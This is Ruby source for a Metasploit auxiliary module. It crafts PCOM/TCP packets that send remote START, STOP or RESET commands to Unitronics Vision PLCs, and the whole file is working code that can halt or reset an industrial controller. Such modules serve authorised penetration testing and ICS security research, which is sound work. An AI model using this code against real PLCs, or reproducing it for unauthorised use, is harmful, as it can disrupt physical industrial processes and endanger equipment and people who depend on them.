##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Rex::Socket::Tcp
  include Rex::Text

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Unitronics PCOM remote START/STOP/RESET command',
      'Description'   => %q{
        Unitronics Vision PLCs allow remote administrative functions to control
        the PLC using authenticated PCOM commands.

        This module supports START, STOP and RESET operations.
      },
      'Author'        =>
        [
          'Luis Rosa <lmrosa[at]dei.uc.pt>'
        ],
      'License'       => MSF_LICENSE,
      'References'    =>
        [
          [ 'URL', 'https://unitronicsplc.com/Download/SoftwareUtilities/Unitronics%20PCOM%20Protocol.pdf' ]
        ],
     ))

    register_options(
      [
        OptEnum.new('MODE', [true, 'PLC command', 'RESET', ['START', 'STOP', 'RESET']]),
        Opt::RPORT(20256),
        OptInt.new('UNITID', [ false, 'Unit ID (0 - 127)', 0]),
      ])
  end

  # compute and return the checksum of a PCOM ASCII message
  def pcom_ascii_checksum(msg)
    (msg.each_byte.inject(:+) % 256 ).to_s(16).upcase.rjust(2, '0')
  end

  # compute pcom length
  def pcom_ascii_len(pcom_ascii)
    Rex::Text.hex_to_raw(pcom_ascii.length.to_s(16).rjust(4,'0').unpack('H4H4').reverse.pack('H4H4'))
  end

  # return a pcom ascii formatted request
  def pcom_ascii_request(command)
    unit_id = datastore['UNITID'].to_s(16).rjust(2,'0')
    # PCOM/ASCII
    pcom_ascii_payload = "" +
      "\x2f" + # '/'
      unit_id +
      command +
      pcom_ascii_checksum(unit_id + command) + # checksum
      "\x0d" # '\r'

    # PCOM/TCP header
    Rex::Text.rand_text_hex(2) + # transaction id
      "\x65" + # ascii (101)
      "\x00" + # reserved
      pcom_ascii_len(pcom_ascii_payload) + # length
      pcom_ascii_payload
  end

  def run
    connect
    case datastore['MODE']
    when 'START'
      print_status 'Sending START command'
      ascii_code = "\x43\x43\x52" # CCR
    when 'STOP'
      print_status 'Sending STOP command'
      ascii_code = "\x43\x43\x53" # CCS
    when 'RESET'
      print_status 'Sending RESET command'
      ascii_code = "\x43\x43\x45" # CCE
    else
      print_error "Unknown MODE"
      return
    end

    sock.put(pcom_ascii_request(ascii_code)) #
    ans = sock.get_once
    if ans.to_s[10,2] == 'CC'
      print_status 'Command accepted'
    end
    disconnect
  end
end
